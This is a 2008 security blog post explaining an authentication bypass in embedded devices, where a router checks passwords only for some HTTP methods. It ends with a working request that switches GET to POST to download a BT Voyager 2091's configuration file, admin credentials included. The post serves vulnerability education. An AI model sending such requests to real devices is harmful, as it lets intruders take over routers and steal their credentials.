---
title: Holes In Embedded Devices Authentication Bypass (pt 3)
author: pagvac
date: Sat, 16 Feb 2008 08:08:17 GMT
template: post.jade
---

We move on with the 3rd kind of authentication bypass bug. You may want to familiarize yourself with the previous two entries [here](/blog/holes-in-embedded-devices-authentication-bypass-pt-1) and [here](/blog/holes-in-embedded-devices-authentication-bypass-pt-2), before you continue.

## Unchecked HTTP methods

A device that is vulnerable to this issue, only performs an authentication check (i.e.: is the password being submitted with a request via basic authentication?) when the request is performed using a certain HTTP method. For instance, most devices have a feature to backup the config file which contains all the configuration settings including admin credentials. Let's say that when the admin user clicks on the "backup configuration" button, a GET request such as the following is submitted by the browser:

```http
GET /settings.cfg HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.8.1.11) Gecko/20071127 Firefox/2.0.0.11
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Language: en-gb,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Connection: Keep-Alive
Referer: http://192.168.1.1/router-settings/
Authorization: Basic YWRtaW46cGFzc3cwcmQ=
```

However, the logic of the device is flawed and allows attackers to save the config file without a password by changing the HTTP method from GET to POST. This very same vulnerability is [present](http://www.securityfocus.com/archive/1/440405) on the BT Voyager 2091 Wireless ADSL router which allows attackers to save the config file without providing username/password:

```http
POST /psiBackupInfo HTTP/1.1
Host: 192.168.1.1
Connection: close
Content-Length: 0
```
